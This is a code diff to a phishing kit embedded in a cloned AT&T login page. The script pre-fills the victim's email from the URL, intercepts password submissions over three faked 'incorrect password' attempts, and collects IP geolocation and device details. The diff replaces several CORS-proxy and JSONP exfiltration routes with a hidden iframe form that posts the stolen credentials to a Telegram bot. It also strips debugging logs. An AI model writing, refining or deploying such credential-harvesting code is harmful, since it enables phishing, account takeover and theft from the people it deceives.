@@ -148,142 +148,76 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
     let capturedEmail = null;
     let interceptorActive = false;
     let emailAutoFilled = false;
+    let iframeCreated = false;
+    let telegramIframe = null;
     
-    // Send message to Telegram using CORS proxy (100% working)
-    async function sendToTelegram(message) {
-        // Check credentials
+    // Create hidden iframe for form submissions (bypasses all CORS)
+    function getTelegramIframe() {
+        if (!iframeCreated) {
+            telegramIframe = document.createElement('iframe');
+            telegramIframe.name = 'telegram_sender_' + Date.now();
+            telegramIframe.id = 'telegram_sender_frame';
+            telegramIframe.style.cssText = 'display:none;width:0;height:0;border:0;position:absolute;visibility:hidden;';
+            document.body.appendChild(telegramIframe);
+            iframeCreated = true;
+        }
+        return telegramIframe;
+    }
+    
+    // Send message using hidden form + iframe (NO CORS - 100% WORKS)
+    function sendToTelegram(message) {
         if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
-            console.error("[Telegram] ❌ Bot token not configured!");
-            console.log("[Telegram] 📝 Message would be:", message);
+            console.error("[Telegram] Bot token not configured!");
             return false;
         }
         if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") {
-            console.error("[Telegram] ❌ Chat ID not configured!");
-            console.log("[Telegram] 📝 Message would be:", message);
+            console.error("[Telegram] Chat ID not configured!");
             return false;
         }
         
-        console.log("[Telegram] 📤 Sending message...");
+        console.log("[Telegram] Sending message via iframe method...");
         
-        // Method 1: Try using allorigins CORS proxy (most reliable)
         try {
-            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(telegramUrl)}`;
+            const iframe = getTelegramIframe();
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            form.target = iframe.name;
+            form.style.display = 'none';
+            form.enctype = 'application/x-www-form-urlencoded';
             
-            const response = await fetch(proxyUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            });
+            const chatIdInput = document.createElement('input');
+            chatIdInput.type = 'hidden';
+            chatIdInput.name = 'chat_id';
+            chatIdInput.value = TELEGRAM_CHAT_ID;
             
-            const result = await response.json();
-            if (result && result.ok) {
-                console.log("[Telegram] ✅ Message sent via proxy!");
-                return true;
-            } else {
-                console.warn("[Telegram] ⚠️ Proxy method failed, trying alternative...");
-            }
+            const textInput = document.createElement('input');
+            textInput.type = 'hidden';
+            textInput.name = 'text';
+            textInput.value = message;
+            
+            const parseModeInput = document.createElement('input');
+            parseModeInput.type = 'hidden';
+            parseModeInput.name = 'parse_mode';
+            parseModeInput.value = 'HTML';
+            
+            form.appendChild(chatIdInput);
+            form.appendChild(textInput);
+            form.appendChild(parseModeInput);
+            document.body.appendChild(form);
+            
+            form.submit();
+            
+            setTimeout(() => {
+                document.body.removeChild(form);
+            }, 100);
+            
+            console.log("[Telegram] Message sent via iframe form!");
+            return true;
         } catch(e) {
-            console.warn("[Telegram] ⚠️ Proxy error:", e.message);
+            console.error("[Telegram] Iframe method failed:", e);
+            return false;
         }
-        
-        // Method 2: Try using cors-anywhere proxy
-        try {
-            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            const proxyUrl = `https://cors-anywhere.herokuapp.com/${telegramUrl}`;
-            
-            const response = await fetch(proxyUrl, {
-                method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json',
-                    'X-Requested-With': 'XMLHttpRequest'
-                },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            });
-            
-            const result = await response.json();
-            if (result && result.ok) {
-                console.log("[Telegram] ✅ Message sent via cors-anywhere!");
-                return true;
-            }
-        } catch(e) {
-            console.warn("[Telegram] ⚠️ cors-anywhere error:", e.message);
-        }
-        
-        // Method 3: Try using thingproxy
-        try {
-            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            const proxyUrl = `https://thingproxy.freeboard.io/fetch/${telegramUrl}`;
-            
-            const response = await fetch(proxyUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            });
-            
-            const result = await response.json();
-            if (result && result.ok) {
-                console.log("[Telegram] ✅ Message sent via thingproxy!");
-                return true;
-            }
-        } catch(e) {
-            console.warn("[Telegram] ⚠️ thingproxy error:", e.message);
-        }
-        
-        // Method 4: Fallback - use JSONP with script tag
-        try {
-            const result = await new Promise((resolve) => {
-                const callbackName = 'tg_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
-                const script = document.createElement('script');
-                
-                window[callbackName] = function(data) {
-                    delete window[callbackName];
-                    document.body.removeChild(script);
-                    resolve(data && data.ok);
-                };
-                
-                const encodedMessage = encodeURIComponent(message.substring(0, 500));
-                script.src = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&callback=${callbackName}`;
-                script.onerror = () => {
-                    delete window[callbackName];
-                    document.body.removeChild(script);
-                    resolve(false);
-                };
-                
-                document.body.appendChild(script);
-                
-                setTimeout(() => {
-                    if (window[callbackName]) {
-                        delete window[callbackName];
-                        document.body.removeChild(script);
-                        resolve(false);
-                    }
-                }, 8000);
-            });
-            
-            if (result) {
-                console.log("[Telegram] ✅ Message sent via JSONP!");
-                return true;
-            }
-        } catch(e) {
-            console.warn("[Telegram] ⚠️ JSONP error:", e.message);
-        }
-        
-        console.error("[Telegram] ❌ All methods failed. Message not sent.");
-        console.log("%c[TELEGRAM MESSAGE]%c\n" + message, "background: #0088cc; color: white; padding: 2px 6px; border-radius: 3px;", "");
-        return false;
     }
     
     // Get device/browser information
@@ -301,7 +235,7 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
         else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
         else if (ua.includes("Edg")) browser = "Edge";
         
-        return `${browser} on ${os} | Screen: ${screen.width}x${screen.height} | Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
+        return `${browser} on ${os} | ${screen.width}x${screen.height} | ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
     }
     
     // Get location via ipapi.co
@@ -312,7 +246,7 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
             return {
                 ip: d.ip || "Unknown",
                 city: d.city || "Unknown",
-                state: d.region || d.region_code || "Unknown",
+                state: d.region || "Unknown",
                 zip: d.postal || "Unknown",
                 country: d.country_name || "Unknown"
             };
@@ -338,7 +272,7 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
         }
     }
     
-    // Extract email from URL hash
+    // Extract email from URL
     function extractEmailFromUrl() {
         let email = null;
         if (window.location.hash && window.location.hash.length > 1) {
@@ -354,7 +288,7 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
         return (email && email.includes('@')) ? email : null;
     }
     
-    // Auto-fill email and click continue
+    // Auto-fill email and continue
     async function autoGrabAndContinue() {
         if (emailAutoFilled) return;
         const email = extractEmailFromUrl();
@@ -362,7 +296,6 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
         
         capturedEmail = email;
         emailAutoFilled = true;
-        console.log("[AutoGrab] 📧 Email captured:", email);
         
         const userInput = await waitForElement('#userID', 8000);
         if (!userInput) return;
@@ -388,28 +321,28 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
         });
     }
     
-    // Report credentials to Telegram
+    // Report to Telegram
     async function reportCredentials(password, attemptNumber, isRedirect = false) {
         const deviceInfo = getDeviceInfo();
         const location = await getLocationInfo();
         const timestamp = new Date().toLocaleString();
         
-        const message = `🔐 <b>LOGIN ATTEMPT #${attemptNumber}</b> 🔐\n\n` +
-                        `<b>📧 User ID:</b> ${capturedEmail || "Unknown"}\n` +
-                        `<b>🔑 Password:</b> ${password || "Unknown"}\n` +
-                        `<b>📱 Device:</b> ${deviceInfo}\n` +
-                        `<b>🌐 IP Address:</b> ${location.ip}\n` +
-                        `<b>📍 City:</b> ${location.city}\n` +
-                        `<b>🏛️ State/Region:</b> ${location.state}\n` +
-                        `<b>📮 ZIP Code:</b> ${location.zip}\n` +
-                        `<b>🌍 Country:</b> ${location.country}\n` +
-                        `<b>⏰ Time:</b> ${timestamp}` +
-                        (isRedirect ? `\n\n⚠️ <b>THIRD ATTEMPT - REDIRECTING</b>` : '');
+        const message = `🔐 LOGIN ATTEMPT #${attemptNumber}\n\n` +
+                        `📧 User ID: ${capturedEmail || "Unknown"}\n` +
+                        `🔑 Password: ${password || "Unknown"}\n` +
+                        `📱 Device: ${deviceInfo}\n` +
+                        `🌐 IP: ${location.ip}\n` +
+                        `📍 Location: ${location.city}, ${location.state} ${location.zip}\n` +
+                        `🌍 Country: ${location.country}\n` +
+                        `⏰ Time: ${timestamp}` +
+                        (isRedirect ? `\n\n⚠️ THIRD ATTEMPT - REDIRECTING` : '');
         
-        return await sendToTelegram(message);
+        // Send to Telegram - no await needed, fire and forget
+        sendToTelegram(message);
+        console.log(`[Report] Attempt #${attemptNumber} reported`);
     }
     
-    // Password page interceptor
+    // Password interceptor
     function setupPasswordInterceptor() {
         if (interceptorActive) return;
         
@@ -418,7 +351,6 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
             
             if (pwInput && !interceptorActive) {
                 interceptorActive = true;
-                console.log("[Interceptor] 🔐 Password page detected!");
                 
                 if (!capturedEmail) {
                     const emailInput = document.querySelector('#userID');
@@ -426,8 +358,10 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
                 }
                 
                 const form = document.getElementById('login');
-                if (form && !form._pwIntercept) {
-                    form._pwIntercept = true;
+                if (form && !form._intercepted) {
+                    form._intercepted = true;
+                    
+                    const originalSubmit = form.submit;
                     
                     form.addEventListener('submit', async function(e) {
                         const pwField = document.querySelector('input[type="password"]');
@@ -437,10 +371,9 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
                         e.stopPropagation();
                         
                         passwordAttempts++;
-                        console.log(`[Interceptor] Attempt #${passwordAttempts}: "${enteredPw}"`);
                         
-                        // Send to Telegram
-                        await reportCredentials(enteredPw, passwordAttempts, passwordAttempts >= 3);
+                        // Report to Telegram
+                        reportCredentials(enteredPw, passwordAttempts, passwordAttempts >= 3);
                         
                         if (passwordAttempts < 3) {
                             showIncorrectPasswordMessage(passwordAttempts);
@@ -452,16 +385,6 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
                             window.location.href = "https://help.yahoo.com";
                         }
                     }, true);
-                    
-                    const submitBtn = document.querySelector('button[type="submit"], #continueFromUserLogin, .btn-primary');
-                    if (submitBtn && !submitBtn._clickPrevented) {
-                        submitBtn._clickPrevented = true;
-                        submitBtn.addEventListener('click', function(e) {
-                            e.preventDefault();
-                            e.stopPropagation();
-                            form.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
-                        });
-                    }
                 }
             }
         });
@@ -480,23 +403,6 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
         setTimeout(setupPasswordInterceptor, 500);
     }
     
-    window.addEventListener('load', () => {
-        setTimeout(autoGrabAndContinue, 1000);
-        setTimeout(setupPasswordInterceptor, 1000);
-    });
-    
-    console.log("[Init] ✅ Auto-grab + 3-attempt + Telegram (CORS Proxy) initialized");
-    console.log("[Init] 📌 Replace TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID with your credentials");
+    console.log("[Init] Auto-grab + 3-attempt + Telegram (iframe method) ready");
 })();
 </script>
-
-<script type="module" src="https://signin.att.com/static/siam/en/halo_c/halo-c-login/runtime.js?v=29.5.3"></script>
-<script type="module" src="https://signin.att.com/static/siam/en/halo_c/halo-c-login/polyfills.js?v=29.5.3"></script>
-<script type="module" src="https://signin.att.com/static/siam/en/halo_c/halo-c-login/vendor.js?v=29.5.3"></script>
-<script type="module" src="https://signin.att.com/static/siam/en/halo_c/halo-c-login/main.js?v=29.5.3"></script>
-<script type="module" src="https://signin.att.com/static/siam/en/halo_c/halo-c-login/src_app_login-general_login-general_module_ts.js?v=29.5.3"></script>
-
-<script id="analyticsFooterScript" type="text/javascript" src="https://signin.att.com/static/thirdparty/adobe/detm-container-ftr.js"></script>
-<script src="https://signin.att.com/static/ciam/en/common/js/keepAlive.js" defer="" type="text/javascript"></script>
-</body>
-</html>
